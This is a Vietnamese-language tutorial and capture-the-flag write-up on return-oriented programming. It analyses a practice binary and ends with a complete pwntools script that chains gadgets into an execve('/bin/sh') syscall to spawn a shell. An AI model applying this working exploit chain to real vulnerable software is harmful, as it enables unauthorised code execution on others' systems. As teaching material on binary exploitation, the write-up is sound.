
# Return-Oriented Programming (ROP) Explanation
___

### Tại sao có kỹ thuật tấn công ROP?

Sự xuất hiện của các cơ chế bảo vệ như Non-executable (NX) hay Data Execution Prevention (DEP) giúp chống thực thi code ở vùng nhớ không cho phép. Có nghĩa là khi chúng ta khai thác lỗ hổng Buffer Overflow (BOF) của một chương trình, nếu chương trình này có cơ chế bảo vệ NX hay DEP thì shellcode chúng ta chèn vào xem như vô dụng - bởi vì vùng nhớ lưu shellcode đã bị đánh dấu là không được thực thi.

ROP là một kỹ thuật tấn công tận dụng các đoạn code có sẵn của chương trình (.code section) Ý tưởng chính là sử dụng các gadget hiện có trong chương trình trên cơ sở tràn bộ đệm ngăn xếp. Thay đổi giá trị của một số thanh ghi hoặc các biến để điều khiển luồng thực thi của chương trình. Gadget là các chuỗi lệnh kết thúc bằng ret. Thông qua các chuỗi lệnh này, chúng ta có thể sửa đổi nội dung của một số địa chỉ nhất định để tạo điều kiện thuận lợi cho việc kiểm soát luồng thực thi của chương trình.

Nó được gọi là ROP vì cốt lõi là sử dụng lệnh ret trong tập lệnh để thay đổi thứ tự thực thi của luồng lệnh. Các cuộc tấn công ROP thường phải đáp ứng các điều kiện sau:

- Có một phần tràn trong chương trình và địa chỉ trả về có thể được kiểm soát.

- Bạn có thể tìm thấy các gadget đáp ứng các điều kiện và địa chỉ của các gadget tương ứng.
- Kỹ năng cơ bản của rop, bạn phải đọc hiểu 1 số lệnh assembly cơ bản như: mov , lea, leave, pop, push, syscall(x64), int 0x80 (32 bit tương đương với syscall trong x64), ret, jmp, call, ...

## Ví dụ cơ bản:
> # challagen: [ROPbasic](https://github.com/shawking2/Writeup/blob/main/ROP/src/rop?raw=true)

Ta có thể dễ dàng nhận ra lỗ hổng tràn bộ đệm ở hàm gets.
Phân tích qua lệnh file:
```
$ file rop
rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
```
statically linked có nghĩa tất cả các thư viện bắt buộc đều được bao gồm trong file binary. Điều này có nghĩa là file binary không cần tải bất kỳ thư viện nào như libc. Các cách khai thác lợi dụng got
sẽ không khả thi.
Phân tích qua checksec:
```
$ checksec rop
[*] '/mnt/d/19520/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Xem mã giả bằng IDA:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```
Với lỗ hổng ở hàm gets ta có thể dễ dàng điểu khiển return addr. Với offset của v4 với ebp là 0x64.
Tiếp theo ta sẽ sử dụng kỹ thuật ROP để khai thác. Ta sẽ lợi dụng system call ```execve("/bin/sh",NULL,NULL)``` để giúp ta có được shell. Nếu bạn nào còn chưa biết system call là gì có thể tham khảo ở đây: https://en.wikipedia.org/wiki/System_call
Yêu cầu của system call execve ```execve("/bin/sh",NULL,NULL)```:
- eax = 0xb (đây là số system call của execve , eax sẽ luôn là thanh ghi chưa giá trị này)
- ebx sẽ chứa tham số thứ nhất -> ebx phải trỏ đến địa chỉ chưa chuỗi "/bin/sh"
- ecx sẽ chứa tham số thứ hai -> ecx = 0 (0 -> NULL)
- edx sẽ chứa tham số thứ ba -> edx = 0
Để kiểm soát các thanh ghi này ta sẽ sử dụng các gadget. Công cụ Ropgadget sẽ giúp chúng ta dễ dàng tìm kiếm chúng.
```
ROPgadget --binary rop
```
Kiểm soát giá trị cho eax:
```
$ ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```
Khi ret trỏ đến địa chỉ gadget ```0x080bb196 : pop eax ; ret``` nó sẽ lấy thực thi lệnh pop lấy giá trị tại esp trỏ tới gán cho eax sau đó tiếp tục thực hiện ret.
Các gadget khác cũng tìm kiếm theo cách tương tự
```
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```
Chuỗi "/bin/sh" đã tồn tại sẵn trong file: 
```
ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh
```
Và cuối cùng gadget quan trọng nhất int 0x80 (ở x64 sẽ là gadget syscall):
```
ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```
Chúng ta sẽ lần lượt đặt các gadget này tại địa chỉ của return addr của hàm main, tiếp sau là giá trị mà muốn các thanh ghi lưu trữ và tiếp theo là gadget tiếp theo cần thực thi. 
Hình mô tả:
![screen](https://github.com/shawking2/Writeup/blob/main/ROP/img/imgrop.png)
Code khai thác (python2):
```
from pwn import *

p = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = "A"*112 # 0x64 + 4
payload += p32(pop_eax_ret)
payload += p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret)
payload += p32(0)
payload += p32(0)
payload += p32(binsh)
payload += p32(int_0x80)
p.sendline(payload)
p.interactive()
```









